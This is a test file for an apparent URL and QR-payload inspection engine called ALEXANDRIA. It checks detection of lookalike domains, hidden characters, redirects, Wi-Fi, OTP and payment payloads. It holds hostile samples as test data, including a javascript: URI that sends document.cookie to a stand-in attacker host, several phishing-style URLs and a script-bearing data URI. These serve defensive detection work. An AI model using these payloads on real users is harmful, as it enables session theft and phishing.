/* ALEXANDRIA -- tests for the inspection engine.
 *
 * Run with:  node tests/inspect.test.js
 *
 * No framework and no dependencies. Two things are checked for every case:
 * that the expected findings appear, and that nothing unexpected does. The
 * second matters as much as the first. A checker that flags everything is
 * useless in a different way from one that flags nothing, and false alarms
 * are what teach people to stop reading warnings.
 *
 * Exits non-zero on failure.
 */

"use strict";

const fs = require("fs");
const path = require("path");

global.window = global;
const root = path.join(__dirname, "..");
new Function(fs.readFileSync(path.join(root, "js/punycode.js"), "utf8"))();
new Function(fs.readFileSync(path.join(root, "js/inspect.js"), "utf8"))();
const A = global.ALEXANDRIA;

let pass = 0, fail = 0;

/* expect: codes that must appear.  forbid: codes that must not. */
function check(label, payload, opts) {
  const report = A.inspect(payload);
  const codes = report.findings.map(f => f.code);
  const problems = [];

  (opts.expect || []).forEach(code => {
    if (codes.indexOf(code) < 0) problems.push("missing " + code);
  });
  (opts.forbid || []).forEach(code => {
    if (codes.indexOf(code) >= 0) problems.push("unexpected " + code);
  });
  if (opts.type && report.type !== opts.type) {
    problems.push("type " + report.type + ", wanted " + opts.type);
  }
  if (opts.quiet && codes.length) {
    problems.push("expected nothing, got " + codes.join(","));
  }
  if (opts.worst && report.worst() !== opts.worst) {
    problems.push("severity " + report.worst() + ", wanted " + opts.worst);
  }

  if (problems.length) {
    fail++;
    console.log("  FAIL " + label.padEnd(44) + problems.join("; "));
  } else {
    pass++;
    console.log("  ok   " + label.padEnd(44)
                + (codes.join(",") || "no findings"));
  }
}

console.log("ORDINARY ADDRESSES ARE LEFT ALONE");
check("plain https", "https://example.com/page",
      { type: "url", forbid: ["MIXED_SCRIPT", "LOOKALIKE_LABEL",
                              "EMBEDDED_CREDENTIALS", "NOT_ENCRYPTED"] });
check("https with a query", "https://example.org/search?q=chemistry",
      { type: "url", forbid: ["EMBEDDED_URL", "HEAVY_ENCODING"] });
check("a genuine German domain", "https://xn--bcher-kva.de",
      { type: "url", forbid: ["LOOKALIKE_LABEL", "MIXED_SCRIPT",
                              "POINTLESS_PUNYCODE"] });
check("a genuine Japanese domain", "https://xn--wgv71a119e.jp",
      { type: "url", forbid: ["LOOKALIKE_LABEL", "MIXED_SCRIPT"] });
check("plain text", "Meet me at the north entrance at six",
      { type: "text", quiet: true });

console.log("\nIMPERSONATED HOSTS");
check("all-Cyrillic apple", "https://\u0430\u0440\u0440\u04cf\u0435.com",
      { expect: ["LOOKALIKE_LABEL"], worst: "critical" });
check("the same, as punycode", "https://xn--80ak6aa92e.com",
      { expect: ["LOOKALIKE_LABEL"], worst: "critical" });
check("one Cyrillic letter in a Latin word",
      "https://\u0430pple.com", { expect: ["MIXED_SCRIPT"], worst: "critical" });
check("Greek omicron in google", "https://g\u03bfogle.com",
      { expect: ["MIXED_SCRIPT"] });
check("punycode hiding plain ASCII", "https://xn--paypal-.com",
      { expect: ["POINTLESS_PUNYCODE"] });

console.log("\nADDRESSES THAT ARE NOT WHERE THEY LOOK");
check("credentials before the @", "https://apple.com@evil.tk/login",
      { expect: ["EMBEDDED_CREDENTIALS"], worst: "critical" });
check("brand pushed into a subdomain",
      "https://paypal.com.secure-login.tk/", { expect: ["TLD_IN_MIDDLE"] });
check("a redirect carried in the query",
      "https://trusted.org/go?to=https%3A%2F%2Fevil.tk%2Fpay",
      { expect: ["EMBEDDED_URL"] });
check("a numeric host", "http://192.168.4.19/admin",
      { expect: ["IP_HOST", "NOT_ENCRYPTED"] });
check("very many labels",
      "https://a.b.c.d.e.f.g.example.com/", { expect: ["MANY_LABELS"] });

console.log("\nHIDDEN CHARACTERS");
check("zero-width space in the host",
      "https://exam\u200bple.com", { expect: ["INVISIBLE_CHARS"],
                                     worst: "critical" });
check("right-to-left override in the path",
      "https://files.example.com/\u202egnp.exe",
      { expect: ["BIDI_OVERRIDE"], worst: "critical" });

console.log("\nSCHEMES THAT ARE NOT PAGES");
check("javascript", "javascript:fetch('https://evil.tk?c='+document.cookie)",
      { type: "code", expect: ["DANGEROUS_SCHEME"], worst: "critical" });
check("data URI carrying a document",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      { type: "code", expect: ["DANGEROUS_SCHEME"] });

console.log("\nWEAKER SIGNALS, REPORTED AS SUCH");
check("unencrypted", "http://example.com/", { expect: ["NOT_ENCRYPTED"],
                                              worst: "warning" });
check("a shortener", "https://bit.ly/3xR2p", { expect: ["SHORTENER"] });
check("a very cheap registry", "https://something.tk/",
      { expect: ["CHEAP_TLD"] });
check("an unusual port", "https://example.com:8443/",
      { expect: ["UNUSUAL_PORT"] });
check("no scheme at all", "example.com/offer", { expect: ["NO_SCHEME"] });

console.log("\nPAYLOADS THAT ARE NOT LINKS");
check("open Wi-Fi", "WIFI:T:nopass;S:Free Airport WiFi;;",
      { type: "wifi", expect: ["WIFI_JOIN", "WIFI_OPEN"] });
check("protected Wi-Fi", "WIFI:T:WPA;S:Home;P:hunter2;;",
      { type: "wifi", expect: ["WIFI_JOIN"], forbid: ["WIFI_OPEN"] });
check("hidden Wi-Fi", "WIFI:T:WPA;S:Guest;P:abc;H:true;;",
      { type: "wifi", expect: ["WIFI_HIDDEN"] });
check("a two-factor secret",
      "otpauth://totp/ACME:user@example.com?secret=JBSWY3DPEHPK3PXP&issuer=ACME",
      { type: "otp", expect: ["OTP_SECRET"], worst: "critical" });
check("a pre-written message", "SMSTO:+41791234567:YES",
      { type: "sms", expect: ["SMS_PREFILLED"] });
check("a telephone number", "tel:+41791234567",
      { type: "tel", expect: ["TEL_DIAL"] });
check("a payment request",
      "bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa?amount=0.5",
      { type: "payment", expect: ["PAYMENT"] });
check("a contact card with a link inside",
      "BEGIN:VCARD\nFN:Jane Doe\nTEL:+41791234567\nURL:https://evil.tk\nEND:VCARD",
      { type: "contact", expect: ["CONTACT_URL"] });
check("a map location", "geo:46.9481,7.4474", { type: "geo", quiet: true });

console.log("\nPUNYCODE AGAINST THE SPECIFICATION");
[["bcher-kva", "b\u00fccher"],
 ["80ak6aa92e", "\u0430\u0440\u0440\u04cf\u0435"],
 ["n3h", "\u2603"],
 ["mgbh0fb", "\u0645\u062b\u0627\u0644"]].forEach(function (pair) {
  const got = A.punycode.decode(pair[0]);
  if (got === pair[1]) { pass++; console.log("  ok   xn--" + pair[0]); }
  else {
    fail++;
    console.log("  FAIL xn--" + pair[0] + " -> " + JSON.stringify(got)
                + ", wanted " + JSON.stringify(pair[1]));
  }
});

console.log("\n" + pass + " passed, " + fail + " failed");
process.exit(fail ? 1 : 0);
